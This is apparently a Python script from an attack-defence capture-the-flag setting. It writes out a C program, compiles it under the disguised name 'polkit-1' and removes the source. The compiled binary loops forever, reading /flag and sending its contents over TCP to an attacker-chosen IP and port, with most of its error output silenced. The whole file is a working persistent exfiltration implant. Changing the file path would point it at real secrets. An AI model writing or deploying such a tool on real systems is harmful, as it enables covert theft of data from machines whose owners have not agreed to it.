import subprocess
import os


def main(ip_addr,port):
    # 定义C代码字符串
    c_code1 = """
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>
    #include <arpa/inet.h>

    #define FLAG_PATH "/flag"      // 需要读取的文件路径
    #define RETRY_DELAY 2          // 失败后的重试间隔（秒）
    #define BUFFER_SIZE 1024
    #define SERVER_PORT """


    c_code2 = '''
    #define SERVER_IP "'''

    c_code3 = """"  // 目标IP地址

    void send_flag() {
    struct sockaddr_in server_addr;
    int sock;
    char buffer[1024];
    FILE *file;

    while (1) {
        // 读取 /flag 文件内容
        file = fopen(FLAG_PATH, "r");
        if (file == NULL) {
            //perror("无法打开 /flag 文件");
            sleep(RETRY_DELAY);
            continue;
        }

        memset(buffer, 0, sizeof(buffer));
        if (fgets(buffer, sizeof(buffer), file) == NULL) {
            //perror("读取 /flag 文件失败");
            fclose(file);
            sleep(RETRY_DELAY);
            continue;
        }
        fclose(file);

        // 创建 TCP 连接
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            //perror("创建套接字失败");
            sleep(RETRY_DELAY);
            continue;
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            //perror("连接失败");
            close(sock);
            sleep(RETRY_DELAY);
            continue;
        }

        // 发送文件内容
        if (send(sock, buffer, strlen(buffer), 0) < 0) {
            perror("发送数据失败");
        } else {
            //printf("发送成功: %s", buffer);
        }

        close(sock);
        sleep(RETRY_DELAY);  // 休眠后继续读取
    }
    }

    int main() {
        send_flag();
        return 0;
    }
    """





    c_code = c_code1 + str(port) + c_code2 + str(ip_addr) + c_code3
    print(c_code)

    # 将C代码写入临时文件
    c_file = "temp.c"
    with open(c_file, "w") as f:
        f.write(c_code)

    # 使用gcc编译C代码
    executable = "polkit-1"
    compile_command = ["gcc", c_file, "-o", executable]

    try:
        subprocess.run(compile_command, check=True)
        print("compile successful!")

        # 运行生成的可执行文件
        # run_command = f"./{executable}"
        # subprocess.run(run_command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"compile failed! {e}")
    finally:
        # 清理临时文件
        if os.path.exists(c_file):
            os.remove(c_file)
        # if os.path.exists(executable):
        #     os.remove(executable)
